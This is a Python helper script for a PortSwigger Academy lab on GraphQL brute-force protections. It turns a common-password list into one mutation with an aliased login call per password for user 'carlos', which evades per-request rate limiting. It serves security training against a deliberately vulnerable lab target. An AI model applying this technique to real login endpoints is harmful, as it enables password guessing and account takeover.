# This is a helper script for the "Bypassing GraphQL brute force protections" lab in the Portswigger 
# Academy GraphQL API vulnerabilities learning path
# 
# This vulnerable GraphQL endpoint rate-limits based on HTTP requests, not operations on the 
# endpoint. So we can bypass the rate limiting with aliases. We want to test a bunch passwords 
# for the user carlos, so this script will create a query that checks all passwords with a single 
# request.

# Portswigger authentication lab password list
password_list = "123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow".split(',')

# Create an alias for each query
# Each alias must have a unique name
i = 0
aliases = []
for password in password_list:
    alias = (f'\tbruteforce{i}:login(input:{{password: "{password}", username: "carlos"}}) {{\n'
              '\t\ttoken\n'
              '\t\tsuccess\n'
              '\t}\n')
    aliases.append(str(alias))
    i+=1

# Finish crafting the response by wrapping it in a "mutation" block
print("mutation {")
for alias in aliases:
    print(alias)
print("}")

